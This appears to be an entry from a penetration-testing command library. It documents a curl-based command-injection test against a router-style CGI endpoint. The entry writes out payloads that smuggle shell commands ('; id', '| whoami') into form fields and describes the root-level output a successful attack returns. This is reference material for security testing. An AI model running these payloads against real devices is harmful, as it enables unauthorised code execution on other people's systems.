---
data: >-
  curl -X POST 'http://target-device-ip/cgi-bin/webproc' -d
  'action=ping&host=8.8.8.8; id' -H 'Content-Type:
  application/x-www-form-urlencoded'
tags:
  - injection
  - test
  - recon
type: command
executor: bash
platforms:
  - Linux
  - Embedded
id: 8b72b56b-52ad-45fa-a197-b4feb3382551
created_at: '2025-12-14T17:27:35.824Z'
updated_at: '2025-12-14T17:27:35.824Z'
verified: false
validated: true
submitted: true
---
# curl-command-injection-test

## Command

```bash
curl -X POST 'http://target-device-ip/cgi-bin/webproc' -d 'action=ping&host=8.8.8.8; id' -H 'Content-Type: application/x-www-form-urlencoded'
```

## Description

This command tests for command injection vulnerabilities in web endpoints by sending a crafted POST request with an appended shell command (`; id`) to bypass filters and execute arbitrary code on the target device.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-d 'action=ping&host=8.8.8.8; id'` | Payload data with injection | Yes |
| `-H 'Content-Type: ...'` | Sets the content type header | Yes |
| `http://target-device-ip/cgi-bin/webproc` | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://192.168.1.1/cgi-bin/webproc' -d 'param=value; id'
```

### Advanced Usage

```bash
curl -X POST 'http://target/cgi-bin/webproc' -d 'host=google.com | whoami' -H 'Cookie: session=abc' -v
```

## Expected Output

Successful injection returns a response including the output of the `id` command, such as "uid=0(root) gid=0(root)", mixed with normal endpoint response. Failure shows filtered or error response without command output.

## Related

- [[Related Procedure]]
